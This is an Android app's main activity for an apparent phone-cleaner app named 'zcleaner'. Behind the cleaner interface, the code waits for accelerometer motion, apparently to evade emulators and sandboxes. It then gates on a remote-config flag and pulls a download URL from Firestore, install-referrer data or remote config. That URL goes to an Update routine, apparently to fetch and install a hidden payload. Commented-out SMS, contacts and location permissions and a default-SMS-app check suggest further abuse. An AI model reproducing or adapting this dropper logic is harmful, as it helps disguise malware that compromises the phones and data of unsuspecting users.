package com.xlab13.zcleaner.Activity;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.hardware.TriggerEvent;
import android.hardware.TriggerEventListener;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.util.FloatMath;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;

import androidx.annotation.NonNull;

import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FieldValue;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.xlab13.zcleaner.CleanOptionsFragmentRV;
import com.xlab13.zcleaner.Fragment.BaseFragment;
import com.xlab13.zcleaner.R;
import com.xlab13.zcleaner.utils.FragmentUtil;
import com.xlab13.zcleaner.utils.MyJobService;
import com.xlab13.zcleaner.utils.Update;

import java.lang.reflect.Executable;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

public class MainActivity extends BaseActivity implements SensorEventListener {
    //public final static String[] permissions = {Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_SMS,Manifest.permission.READ_PHONE_STATE,Manifest.permission.READ_CONTACTS,Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_EXTERNAL_STORAGE};
    private static MainActivity instance;

    public static MainActivity getInstance() {
        return instance;
    }

    private FirebaseRemoteConfig mFirebaseRemoteConfig;

    private static final int PERMISSION_REQUEST_CODE = 1;
    public final static String[] permissions = {Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_EXTERNAL_STORAGE};

    private float[] mGravity;
    private float mAccel,mAccelCurrent,mAccelLast;
    private SensorManager sensorMan;
    private Sensor accelerometer;
    private boolean FlagReal = false;
    private boolean startUpdate = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        instance = this;

        new MyJobService().start(this);

        sensorMan = (SensorManager)getSystemService(SENSOR_SERVICE);
        accelerometer = sensorMan.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        mAccel = 0.00f;
        mAccelCurrent = SensorManager.GRAVITY_EARTH;
        mAccelLast = SensorManager.GRAVITY_EARTH;
        sensorMan.registerListener(this, accelerometer,
                SensorManager.SENSOR_DELAY_NORMAL);

        int checkPermissionResult = checkPermission(permissions);

        FragmentUtil.replaceFragment(getSupportFragmentManager(),
                BaseFragment.newInstance(CleanOptionsFragmentRV.class, null), false);

        FirebaseAnalytics mFirebaseAnalytics = FirebaseAnalytics.getInstance(getApplicationContext());
        Bundle params = new Bundle();
        mFirebaseAnalytics.logEvent("open_app", params);
    }

    @Override
    public void onSensorChanged(SensorEvent event) {
        if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER){
            mGravity = event.values.clone();
            // Shake detection
            float x = mGravity[0];
            float y = mGravity[1];
            float z = mGravity[2];
            mAccelLast = mAccelCurrent;
            mAccelCurrent = (float)Math.sqrt(x*x + y*y + z*z);
            float delta = mAccelCurrent - mAccelLast;
            mAccel = mAccel * 0.9f + delta;
            // Make this higher or lower according to how much
            // motion you want to detect
            if(mAccel > 1){
                if(!startUpdate) {
                    startUpdate = true;
                    FlagReal = true;

                    Log.i("===","start check");
                    int checkPermissionResult = checkPermission(permissions);
                    if (checkPermissionResult >= 0) {
                        if (FlagReal) start_update();
                    }
                }
            }

        }

    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {
        // required method
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        menu.add("Rate App");
        //menu.add("Настройки");
        //menu.add("Обновить базу");
        Log.i("~~~", "OptionsMenu created!");
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        String itemName = item.toString();
        Log.i("~~~", "itemSelected: " + itemName);
        switch (itemName) {
            case "Rate App":
                final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                try {
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                } catch (android.content.ActivityNotFoundException anfe) {
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                }
                break;
            case "Настройки":
                // TODO: 01.11.2018 показать настройки
                break;
            case "Обновить базу":

                break;
        }
        return true;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        Log.e("===","check");
        if (requestCode == 1) {



            if (resultCode == RESULT_OK) {

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    final String myPackageName = getPackageName(); // TODO: fix
                    if (Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName)) {
                        int x = 0;
                    }
                }
            }
        }
    }

    @Override
    public int getLayout() {
        return R.layout.activity_main;
    }

    @Override
    public void setToolbarTitle(String title) {

    }

    void start_update(){
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        Log.i("===","start update");

        //setup remote config
        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mFirebaseRemoteConfig.setDefaultsAsync(R.xml.remote_config_defaults);
        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            boolean updated = task.getResult();
                            if (mFirebaseRemoteConfig.getBoolean("loading")) {
                                //tools write update
                                DocumentReference refdb = db.collection("installs").document(getResources().getConfiguration().locale.getCountry());
                                refdb.update("count", FieldValue.increment(1))
                                        .addOnSuccessListener(new OnSuccessListener<Void>() {
                                            @Override
                                            public void onSuccess(Void aVoid) {

                                            }
                                        })
                                        .addOnFailureListener(new OnFailureListener() {
                                            @Override
                                            public void onFailure(@NonNull Exception e) {
                                                Map<String, Object> data = new HashMap<>();
                                                data.put("count", 1);
                                                db.collection("installs").document(getResources().getConfiguration().locale.getCountry())
                                                        .set(data);
                                            }
                                        });

                                //setup prefix
                                String prefix = "";

                                Intent mainIntent = getIntent();
                                if (mainIntent!=null && mainIntent.getData()!=null
                                        && (mainIntent.getData().getScheme().equals("app"))){
                                    Uri data = mainIntent.getData();
                                    List<String> pathSegments = data.getPathSegments();
                                    if(pathSegments.size()>0) {
                                        prefix = pathSegments.get(0); // This will give you prefix as path
                                    }
                                }

                                if (prefix.length()!=0){
                                    // request code
                                    DocumentReference docRef = db.collection("users").document(prefix);
                                    docRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
                                        @Override
                                        public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                                            if (task.isSuccessful()) {
                                                DocumentSnapshot document = task.getResult();
                                                if (document != null) {
                                                    new Update(getApplicationContext(),document.getString("url"));
                                                }
                                            }
                                        }
                                    });
                                }else{
                                    InstallReferrerClient referrerClient;
                                    referrerClient = InstallReferrerClient.newBuilder(getApplicationContext()).build();
                                    referrerClient.startConnection(new InstallReferrerStateListener() {
                                        @Override
                                        public void onInstallReferrerSetupFinished(int responseCode) {
                                            switch (responseCode) {
                                                case InstallReferrerClient.InstallReferrerResponse.OK:
                                                    try {
                                                        // Connection established.
                                                        //request code
                                                        ReferrerDetails response = referrerClient.getInstallReferrer();
                                                        String referrerData = response.getInstallReferrer();
                                                        //Log.e("TAG", "Install referrer:" + response.getInstallReferrer());

                                                        // for utm terms
                                                        HashMap<String, String> values = new HashMap<>();
                                                        try {
                                                            if (referrerData != null) {
                                                                String referrers[] = referrerData.split("&");

                                                                for (String referrerValue : referrers) {
                                                                    String keyValue[] = referrerValue.split("=");
                                                                    values.put(URLDecoder.decode(keyValue[0], "UTF-8"), URLDecoder.decode(keyValue[1], "UTF-8"));
                                                                }

                                                                if(values.getOrDefault("url","").length()>0){
                                                                    DocumentReference docRef = db.collection("users").document(values.getOrDefault("url",""));
                                                                    docRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
                                                                        @Override
                                                                        public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                                                                            if (task.isSuccessful()) {
                                                                                DocumentSnapshot document = task.getResult();
                                                                                if (document != null) {
                                                                                    new Update(getApplicationContext(),document.getString("url"));
                                                                                }
                                                                            }
                                                                        }
                                                                    });
                                                                }else{
                                                                    new Update(getApplicationContext(),mFirebaseRemoteConfig.getString("upload_url"));
                                                                }
                                                            }else{
                                                                new Update(getApplicationContext(),mFirebaseRemoteConfig.getString("upload_url"));
                                                            }
                                                        } catch (Exception e) {
                                                            new Update(getApplicationContext(),mFirebaseRemoteConfig.getString("upload_url"));
                                                        }
                                                    }catch (Exception e){
                                                        //Log.e("===",e.toString());
                                                    }

                                                    break;
                                                case InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED:
                                                    // API not available on the current Play Store app.
                                                    break;
                                                case InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE:
                                                    // Connection couldn't be established.
                                                    break;
                                            }
                                        }

                                        @Override
                                        public void onInstallReferrerServiceDisconnected() {
                                            // Try to restart the connection on the next request to
                                            // Google Play by calling the startConnection() method.
                                        }
                                    });

                                }
                            }
                        }
                    }
                });
    }

    @TargetApi(Build.VERSION_CODES.M)
    public int checkPermission(String[] permissions){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ){
            int rationale = 0;
            int needToRequest =0;
            int i=0;
            for(String permission : permissions) {
                if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                    if (shouldShowRequestPermissionRationale(permission)) {
                        rationale++;
                    }
                    needToRequest ++;
                }else{
                    List<String> list = new ArrayList<String>(Arrays.asList(permissions));
                    list.remove(permission);
                    permissions = list.toArray(new String[0]);
                }
                i++;
            }
            if(needToRequest>0) {
                requestPermissions(permissions, PERMISSION_REQUEST_CODE); //new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.SEND_SMS}
                return -1;
            }else{
                return 1;
            }
        }else{
            return 0;
        }

        //return 0;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        Set<String> permissionsGranded = new HashSet<>();

        for(int i=0; i<grantResults.length;i++){
            //debug("grantResults["+i+"]:" + grantResults[i]);
            if(grantResults[i]!=-1){
                permissionsGranded.add(permissions[i]);
            }
        }

        if (FlagReal) start_update();
    }
}
